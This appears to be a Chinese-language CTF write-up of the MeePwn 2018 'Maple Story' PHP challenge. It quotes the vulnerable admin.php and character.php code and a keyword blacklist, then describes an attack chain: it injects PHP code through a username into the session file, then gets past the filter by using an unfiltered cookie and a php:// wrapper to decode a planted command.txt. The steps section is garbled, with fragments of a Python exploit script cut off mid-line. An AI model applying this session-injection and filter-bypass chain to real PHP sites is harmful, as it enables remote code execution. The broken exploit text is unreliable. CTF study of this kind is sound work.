## admin.php
注意到Session文件中有部分明文信息，记录关于上一次的操作。每一次操作都会记录，但只有`admin.php` 中写入的内容存在可控变量：
    if ( isset($_POST['pet']) && !empty($_POST['pet']) && isset($_POST['email']) && !empty($_POST['email']) )
    {
        $dir='./upload/'.md5($salt.$_POST['email']).'/';
        give_pet($dir,$_POST['pet']);
        if(check_available_pet($_POST['pet']))
        {
            $log_content='['.date("h:i:sa").' GMT+7] gave '.$_POST['pet'].' to player '.search_name_by_mail($conn,$_POST['email']);
            $_SESSION['action']=$log_content;
        }
    }
其中的`search_name_by_mail($conn,$_POST['email'])` 正是用户名，而这是可修改的。所以只要在`CHARACTER`
页面执行一次送宠物给某个用户的操作，Session文件中就会出现该用户的用户名。而如果用户名是PHP代码，就会被执行。
用户名修改有哪些限制？
首先是`文件包含` 小节提到的所有`GET` ，`POST` 参数都必须经过的黑名单过滤。
    function bad_words($value){ $too_bad="/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is";
        $value = preg_replace($too_bad, str_repeat("*",3) ,$value);
        return $value;
    }
    # |\/\/|\(.+\)|`.+`| 比较重要，意味着伪协议、函数、shell都不能直接使用。
然后是`setting.php` （代码见`CPA猜解salt` 小节）中要求的不大于22个字符。
## character.php
所有功能中唯一一个直接写文件的操作在和`CHARACTER` 页面，同样需经过黑名单过滤，并且要求小于20个字符。
    if(isset($_POST['command']) && !empty($_POST['command']))
    {
        if(strlen($_POST['command'])>=20)
        {
            echo 'Too Long';
        }
        else
        {
            save_command($mail,$salt,$_POST['command']);
            header("Refresh:0");
        }
    }
    /*
    function save_command($email,$salt,$data){
        $dir='./upload/'.md5($salt.$email);
        file_put_contents($dir.'/command.txt', $data);
    }
    */
## 利用
### 思路
全局共有两处可以修改文件，可以修改用户名以修改Session文件，也可在`CHARACTER` 页面修改`command.txt` ，但两处都是由`GET`
或`POST` 传的参，参数被黑名单过滤导致无法直接发挥作用。
考虑到COOKIE没有被过滤，可以用作跳板，在Session文件中包含Cookie，在`command.txt`
写入编码后的无害字符串，在Cookie写入利用伪协议读取 `command.txt` 并解码的语句，就成功向Session文件写入了一句话。
其实从哪个文件经由哪个变量跳到哪个文件是有多种可能的，但本题受限于长度这很可能是唯一的解法。
### 步骤
  * 在SETTING处修改用户名为`
    > upload/%s/command.txt`' % hashlib.md5(
        salt + user_email).hexdigest()
    payload3 = """
    '/*
    """
    def xxx():
        for p in payload1.split('\n')[1:-1]:
            do(p)
        for c in payload2:
            p = "
[MeePwn CTF 2018 Qual - Maple
Story](https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html)